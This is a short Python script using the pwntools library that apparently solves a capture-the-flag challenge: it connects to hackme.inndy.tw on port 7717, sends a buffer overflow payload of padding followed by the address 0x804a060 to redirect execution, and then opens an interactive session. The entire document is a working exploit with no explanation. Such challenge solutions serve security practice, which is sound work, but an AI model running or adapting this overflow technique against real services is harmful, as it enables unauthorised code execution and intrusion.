from pwn import *
context.log_level = 'debug'

conn = remote('hackme.inndy.tw',7717)

offset = 0xc4 - 0x08

payload = offset * 'a' + p32(0x804a060)

conn.send(payload)

conn.interactive()